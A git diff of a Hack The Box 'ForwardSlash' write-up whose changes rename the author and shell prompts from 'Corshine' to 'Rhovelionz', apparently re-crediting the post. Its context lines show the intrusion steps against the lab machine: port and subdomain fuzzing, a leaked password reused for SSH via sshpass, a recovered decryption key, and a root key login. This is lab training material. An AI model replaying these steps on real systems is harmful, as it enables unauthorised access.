@@ -1,6 +1,6 @@
 ---
 title: Hackthebox - ForwardSlash
-author: Corshine
+author: Rhovelionz
 date: 2020-06-04 22:21:00 +0700
 categories: [Hackthebox]
 tags: [LFI, Luks, Crypto, Fuzz, Php, Python, Ssrf]
@@ -32,7 +32,7 @@ image: /assets/img/Post/ForwardSlash.jpeg
 ## **<span style='color:#ff5555'>Nmap</span>**
 ***
 ```
-╭─blackarch-corshine
+╭─blackarch-rhovelionz
 ╰─❯ nmap -sV -sC -T4 -p- -oA nmap.full forwardslash.htb
 # Nmap 7.80 scan initiated Thu Apr  9 15:20:58 2020 as: nmap -sV -sC -T4 -p- -oA nmap.full forwardslash.htb
 Nmap scan report for forwardslash.htb (10.10.10.183)
@@ -50,7 +50,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-╭─blackarch-corshine
+╭─blackarch-rhovelionz
 ╰─❯
 ```
 By looking at the result, we only have 2 ports open, `22:ssh` & `80:http`.
@@ -67,7 +67,7 @@ Tried to run **Gobuster** but came out with no interesting things.
 ## **<span style='color:#ff5555'>Wfuzz</span>**
 ***
 ```
-╭─blackarch-corshine
+╭─blackarch-rhovelionz
 ╰─❯ wfuzz  --hh 0  -H 'Host: FUZZ.forwardslash.htb' -u http://10.10.10.183/ --hc 400 -w /usr/share/wordlists/wfuzz/general/common.txt -c
 
 
@@ -98,7 +98,7 @@ Found subdomain `backup`, therefore I added `backup.forwardslash.htb` on `/etc/h
 
 Tried `Gobuster` again
 ```
-╭─blackarch-corshine
+╭─blackarch-rhovelionz
 ╰─❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k  -x "txt,html,php" -u http://backup.forwardslash.htb/ -o gobuster.output -t 50
 ===============================================================
 Gobuster v3.0.1
@@ -435,7 +435,7 @@ if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {
 By seeing that line, it shows `ftp-login` meanwhile there is no `FTP` ports being generated from `nmap` scans, so I figured it out to try to `ssh` with the credentials.
 
 ```
-╭─blackarch-corshine
+╭─blackarch-rhovelionz
 ╰─❯ sshpass -p N0bodyL1kesBack/ ssh chiv@10.10.10.183
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 
@@ -503,7 +503,7 @@ time="$(date +%H:%M:%S | tr -d '\n' | md5sum | tr -d ' -')" && backup
 Output
 
 ```
-chiv@forwardslash:~$ ./corshinebin.sh 
+chiv@forwardslash:~$ ./rhovelionzbin.sh 
 834e8e2a2c83f1b3e2dbfe3929e24b34
 ----------------------------------------------------------------------
 	Pains Next-Gen Time Based Backup Viewer
@@ -531,7 +531,7 @@ backup
 Tried to run it with expectation it will show the timestamp but instead it reveals the best `loot!`
 
 ```
-chiv@forwardslash:~$ ./corshinebin.sh 
+chiv@forwardslash:~$ ./rhovelionzbin.sh 
 47771ddc7eb2d50853a6bf5c4ab81c69
 ----------------------------------------------------------------------
 	Pains Next-Gen Time Based Backup Viewer
@@ -656,7 +656,7 @@ for i in range(1, 20):
 ```
 
 ```
-╭─blackarch-corshine
+╭─blackarch-rhovelionz
 ╰─❯ python2 decryptcipher.py
 Key: ttttttttttttttttt, Msg: Hl��vF��;�������&you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
 ```
@@ -725,7 +725,7 @@ ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
 ```
 
 ```
-╭─blackarch-corshine
+╭─blackarch-rhovelionz
 ╰─❯ ssh -i root_rsa root@forwardslash.htb 
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 
